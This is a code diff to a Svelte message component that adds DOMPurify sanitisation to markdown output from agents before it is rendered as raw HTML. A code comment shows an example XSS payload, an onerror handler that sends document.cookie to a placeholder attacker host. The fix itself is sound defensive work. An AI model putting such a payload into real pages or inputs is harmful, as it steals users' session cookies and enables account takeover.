@@ -1,6 +1,7 @@
 <script lang="ts">
   import { createEventDispatcher } from 'svelte'
   import { marked } from 'marked'
+  import DOMPurify from 'dompurify'
   import type { Message } from './types'
 
   export let message: Message
@@ -12,7 +13,14 @@
     reply: void
   }>()
 
-  $: rendered = message ? marked.parse(message.body || '', { async: false }) as string : ''
+  // Message bodies come from agents — sanitize the marked output before
+  // injecting via {@html}. Without this a body like
+  //   <img src=x onerror="fetch('http://attacker/exfil?'+document.cookie)">
+  // would execute in the operator's webview. DOMPurify strips event
+  // handlers, javascript: URLs, and disallowed tags by default.
+  $: rendered = message
+    ? DOMPurify.sanitize(marked.parse(message.body || '', { async: false }) as string)
+    : ''
   $: needsApproval = message && message.status === 'unread' &&
                      (message.priority === 'action' || message.priority === 'urgent')
 </script>
